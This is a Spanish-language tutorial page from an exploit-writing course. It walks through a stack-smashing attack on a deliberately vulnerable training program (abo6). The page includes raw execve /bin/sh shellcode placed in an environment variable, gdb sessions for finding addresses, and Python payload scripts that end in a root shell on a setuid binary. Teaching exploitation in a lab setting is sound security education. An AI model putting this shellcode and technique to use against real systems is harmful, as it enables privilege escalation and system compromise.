<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">BY-NC-SA</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-usando-variables-de-entorno">Ataque usando variables de entorno</h1>

<h2 id="anlisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="abo-6">Abo 6</h3>
<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="cm">/* abo6.c                                                   *
 * specially crafted to feed your brain by gera@core-sdi.com */</span>

<span class="cm">/* return to me my love                                     */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">pbuf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="qu-hace-el-programa">¿Qué hace el programa?</h3>
<p>Este programa es muy similar al Abo 5, apila dos variables locales: el puntero <code class="highlighter-rouge">pbuf</code> (que apunta al heap) y <code class="highlighter-rouge">buf</code>. Después de copiar el contenido del primer y segundo parámetro en las variables entra en un loop infinito con <code class="highlighter-rouge">while(1)</code>, provocando que <code class="highlighter-rouge">main()</code> nunca retorne.</p>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<p>En este punto de la ejecución el mapa de la pila es el siguiente:</p>
<div class="language-c highlighter-rouge"><pre class="codehilite"><code>    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
       <span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
       <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
     
<span class="n">eip</span> <span class="o">=&gt;</span> <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
       <span class="n">strcpy</span><span class="p">(</span><span class="n">pbuf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
       <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>
<p><img src="imagenes/abo6/layout-pila.png" alt="layout pila" /></p>

<h3 id="cul-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<p>Al igual que en el abo5 de nada nos serviría sobreescribir la dirección de retorno de <code class="highlighter-rouge">main()</code>, ya que por el loop infinito <code class="highlighter-rouge">while(1)</code> nunca retorna.</p>

<h2 id="ataque-smash-the-stack-con-variables-de-entorno">Ataque “Smash the stack” con variables de entorno</h2>
<p>Hasta este punto almacenabamos el shellcode en una variable local dentro de la pila. Si bien hay estrategias para reducir la cantidad de bytes de un shellcode (optimizando el código assembler al máximo), es esperable que este búfer sea demasiado pequeño para almacenarlo. Una solución alternativa es almacenar el shellcode en otros espacios de memoria como las variables de entorno, que no tienen restricciones de tamaño y -a su vez- también se almacenan en la pila.</p>

<p>Aquí un detalle del almacenamiento de las variables de entorno en la pila:</p>

<p><img src="imagenes/variables-entorno.png" alt="variables-entorno" /></p>

<p>Para probar el funcionamiento de este ataque creamos una nueva variable de entorno <code class="highlighter-rouge">VAR</code> con el string “prueba”:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">export</span><span class="kv"> VAR=prueba
</span><span class="w">user@abos:~$ </span><span class="nc">env</span><span class="kv">               ; consultamos las variables de entorno
</span>XDG_SESSION_ID=XXX
TERM=xterm-256color
SHELL=/bin/bash
VAR=prueba                     ; nueva variable de entorno
....
</code></pre></div>
<p>Ahora creamos una variable de entorno <code class="highlighter-rouge">SHELLCODE</code> dónde vamos a almacenar el shellcode:</p>
<div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">for</span><span class="kv"> i in $(python -c 'print("\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")'); do echo -en $i; done &gt; shellcode.bin
</span><span class="w">user@abos:~$ </span><span class="nc">export</span><span class="kv"> SHELLCODE=$(cat shellcode.bin)
</span><span class="w">user@abos:~$ </span><span class="nc">env</span><span class="kv">
</span>XDG_SESSION_ID=XXX
SHELLCODE=�1�[�C��C                                  ; el shellcode
                    ��S
                       1Ұ
                         �1�̀�����/bin/shABBBBCCCC
TERM=xterm-256color
SHELL=/bin/bash
....
</code></pre></div>

<p>En este punto cuando ejecutemos el programa vulnerable sabremos que el shellcode inyectado al que debemos redireccionar la ejecución está en la pila junto al resto de las variables de entorno.</p>

<p>El objetivo será modificar la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> para que apunte a la variable de entorno <code class="highlighter-rouge">shellcode</code> en vez de retornar a <code class="highlighter-rouge">main()</code>. Al igual que antes, lo logramos de manera indirecta:</p>
<ol>
  <li><code class="highlighter-rouge">strcpy(buf,argc[1])</code> con el primer parámetro sobreescribirmos <code class="highlighter-rouge">pbuf</code> para que apunte a la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code>.</li>
  <li><code class="highlighter-rouge">strcpy(pbuf,argc[2])</code> dado que el segundo parámetro modifica el valor al que apunta <code class="highlighter-rouge">pbuf</code>, con él podemos sobreescribir la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> para que apunte a la variable de entorno <code class="highlighter-rouge">SHELLCODE</code>.</li>
</ol>

<h3 id="layout-de-la-pila-deseado">Layout de la pila deseado:</h3>

<p><img src="imagenes/abo6/layout-pila-shell.png" alt="layout pila" /></p>

<ol>
  <li>Inyectamos el shellcode en una nueva variable de entorno
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">gcc</span><span class="kv"> -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o abo6 abo6.c
</span><span class="w">user@abos:~$ </span><span class="nc">sudo</span><span class="kv"> chown root ./abo6; sudo chmod u+s ./abo6                      ; root owner y setuid
</span>
<span class="w">user@abos:~$ </span><span class="nc">for</span><span class="kv"> i in $(python -c 'print("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43")'); do echo -en $i; done &gt; shellcode.bin
</span>
<span class="w">user@abos:~$ </span><span class="nc">export</span><span class="kv"> SHELLCODE=$(cat shellcode.bin)
</span><span class="w">user@abos:~$ </span><span class="nc">env</span><span class="kv">
</span>XDG_SESSION_ID=XXX
SHELLCODE=�1�[�C��C
                 ��S
                    1Ұ
                      �1�̀�����/bin/shABBBBCCCC
TERM=xterm-256color
SHELL=/bin/bash
</code></pre>    </div>
    <blockquote>
      <p><strong>Consideraciones</strong>: en esta instancia se apela a un truco para lograr una <a href="2-practica.md#lograr-privilegios-de-root">shell con privilegios de root</a> se modifican los permisos del binario con <code class="highlighter-rouge">chown</code> y <code class="highlighter-rouge">chmod</code>.</p>
    </blockquote>
  </li>
  <li>Averiguamos la dirección del shellcode en la pila.   <br />
Para lograr consistencia en las direcciones de la pila con y sin <code class="highlighter-rouge">gdb</code>corremos el programa con el script <a href="../configuracion.md#script-fixenv">fixenv de Hellman</a>.
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code>   user@abos:~$ ./r.sh gdb ./abo6
   (gdb) show env
   XDG_SESSION_ID=328
   SHELLCODE=�1�[�C��C                       ; shellcode en env
             �1�̀�����/bin/shABBBBCCCC
   SHELL=/bin/bash
   
   (gdb) x/2000s $esp                           ; vemos addr de shellcode
   0xbffff90a:	"XDG_SESSION_ID=335"
=&gt; 0xbffff91d:	"SHELLCODE=", '\220' &lt;repeats 20 times&gt;, "\061\300\061\333\061\311\231\260\244\315\200j\vXQh//shh/bin\211\343Q\211\342S\211\341\315\200"
   0xbffff95f:	"SHELL=/bin/bash"
   ....

   (gdb) x/4wx 0xbffff91d                      ; ASCII de "SHELLCODE" + nops
   0xbffff91d:	0x4c454853	0x444f434c	0x90903d45	0x90909090

   (gdb) x/xw 0xbffff91d+10                    ; addr nop slide
=&gt; 0xbffff927:	0x90909090
</code></pre>    </div>
    <p>Primero detectamos que en <code class="highlighter-rouge">0xbffff91d</code> comienza el nombre de la variable de entorno, es decir el string “SHELLCODE”. A esa dirección le sumamos diez caracteres para saltearnos el string del nombre y obtener una dirección que desemboque directamente en los NOPs (en <code class="highlighter-rouge">gdb</code> verificamos que en <code class="highlighter-rouge">0xbffff927</code> están los nops). Entonces la dirección a la que debemos redirigir el flujo de ejecución es: <code class="highlighter-rouge">0xbffff927</code>.</p>
  </li>
  <li>
    <p>Armamos ambos argumentos a usar.   <br />
<img src="imagenes/abo6/exploit.png" alt="input" /></p>

    <ol>
      <li>
        <p>Primer argumento: usamos el primer <code class="highlighter-rouge">strcpy(buf,argc[1])</code> para sobreescribir <code class="highlighter-rouge">pbuf</code> con un overflow y lo hacemos apuntar, ya no al heap, sino a la dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code>, que como aún no sabemos cuál es indicamos <code class="highlighter-rouge">0x41414141</code>.</p>

        <p>Con esto armamos un archivo python para ingresar como primer parámetro:</p>
        <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="n">param1</span><span class="o">.</span><span class="n">py</span>
      
<span class="c">#! /usr/bin/env python</span>
      
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
      
<span class="n">len_buf</span> <span class="o">=</span> <span class="mi">256</span>
<span class="n">ret_addr_strcpy</span> <span class="o">=</span> <span class="mh">0x41414141</span>                <span class="c">#???? </span>
      
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span> <span class="o">*</span> <span class="n">len_buf</span>                 <span class="c">#fill buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_strcpy</span><span class="p">)</span>      <span class="c">#set pbuf</span>
      
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre>        </div>
      </li>
      <li>
        <p>Segundo argumento: aprovechando <code class="highlighter-rouge">strcpy(pbuf,argc[2])</code> modificamos el valor al que apunta <code class="highlighter-rouge">pbuf</code>, es decir, modificamos la dirección de retorno del <code class="highlighter-rouge">strcpy()</code> y la reemplazamos por la dirección del shellcode del entorno. 
Armamos un archivo python para ingresar como segundo parámetro:</p>
        <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="n">param2</span><span class="o">.</span><span class="n">py</span> 
      
<span class="c">#! /usr/bin/env python</span>
      
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
      
<span class="n">env_shell_addr</span> <span class="o">=</span> <span class="mh">0xbffff927</span>
      
<span class="n">exploit</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">env_shell_addr</span><span class="p">)</span>         <span class="c">#set ret addr del 2do strcpy()</span>
      
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre>        </div>
      </li>
    </ol>
  </li>
  <li>
    <p>Finalmente, averiguamos la dirección de retorno que va a apilar el segundo <code class="highlighter-rouge">strcpy()</code>, ejecutando el programa vulnerable con los dos argumentos definidos antes.</p>

    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">./r.sh</span><span class="kv"> gdb ./abo6
</span>
(gdb) break 13                                        ; break en 2do strcpy()
(gdb) r "$(./param1.py)" "$(./param2.py)"
(gdb) c
Continuing.

Breakpoint 2, main (argv=3, argc=0xbffff6d4) at abo6.c:13
13    strcpy(pbuf,argc[2]);

(gdb) x/2i $eip                 
=&gt; 0x80484a5 &lt;main+74&gt;: push   DWORD PTR [ebp-0x4]
   0x80484a8 &lt;main+77&gt;: call   0x8048310 &lt;strcpy@plt&gt;
(gdb) si
(gdb) x/i $eip                                        ; llegamos al call de 2do strcpy()
=&gt; 0x80484a8 &lt;main+77&gt;: call   0x8048310 &lt;strcpy@plt&gt;
(gdb) si                                              ; entramos en 2do strcpy()
0x08048310 in strcpy@plt ()
(gdb) x/wx $esp                                       ; vemos ret_addr apilada 
0xbffff528: 0x080484ad
(gdb) 
</code></pre>    </div>
    <p>Llegamos al punto en el que se ejecuta la línea de código <code class="highlighter-rouge">strcpy(pbuf,argc[2])</code>, avanzamos una siguiente instrucción con <code class="highlighter-rouge">si</code> y leemos el tope de la pila <code class="highlighter-rouge">x/wx $esp</code> para conocer en qué dirección se apiló la dirección de retorno a <code class="highlighter-rouge">main()</code>. La dirección de retorno del segundo <code class="highlighter-rouge">strcpy()</code> que debemos sobreescribir es entonces <code class="highlighter-rouge">0xbffff528</code>.</p>

    <blockquote>
      <p><strong>Consideraciones</strong>: el programa vulnerable toma dos argumentos que se almacenan en la pila y por ende su longitud afecta los cálculos de las direcciones. Es por eso que para saber con exactitud la dirección de retorno debemos cuidar que las distintas ejecuciones del programa tengan argumentos siempre de igual longitud. Incluso planificamos que los valores temporales que usamos como <code class="highlighter-rouge">0x41414141</code> ocupen el mismo espacio que ocupará la dirección definitiva.</p>
    </blockquote>

    <p>Actualizamos con la dirección de retorno con el valor correcto en el primer parámetro del exploit.</p>
    <div class="language-python highlighter-rouge"><pre class="codehilite"><code><span class="n">param1</span><span class="o">.</span><span class="n">py</span>
   
<span class="c">#! /usr/bin/env python</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="n">len_buf</span> <span class="o">=</span> <span class="mi">256</span>
<span class="n">ret_addr_strcpy</span> <span class="o">=</span> <span class="mh">0xbffff528</span>
   
<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span> <span class="o">*</span> <span class="n">len_buf</span>                 <span class="c">#fill buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr_strcpy</span><span class="p">)</span>      <span class="c">#set pbuf</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre>    </div>
  </li>
  <li>Lo ejecutamos y logramos la shell.
    <div class="language-shell_session highlighter-rouge"><pre class="codehilite"><code><span class="w">user@abos:~$ </span><span class="nc">./r.sh</span><span class="kv"> ./abo6 "$(./param1.py)" "$(./param2.py)"
</span><span class="ni"># </span><span class="nc">id</span><span class="kv">
</span>uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user),27(sudo)
<span class="ni"># </span><span class="nc">whoami</span><span class="kv">
</span>root
<span class="ni"># </span><span class="kv">
</span></code></pre>    </div>
    <p>Suponiendo que el binario vulnerable fue creado por root con permisos especiales setuid, con este ataque lograríamos una root shell que podrá por ejemplo acceder a archivos como root, etc.</p>
  </li>
</ol>

<h2 id="material-consultado">Material consultado</h2>
<p>[1]. Erickson, Jon. (2008). Hacking: the art of exploitation.</p>


</div>

    </div>

  </body>
</html>
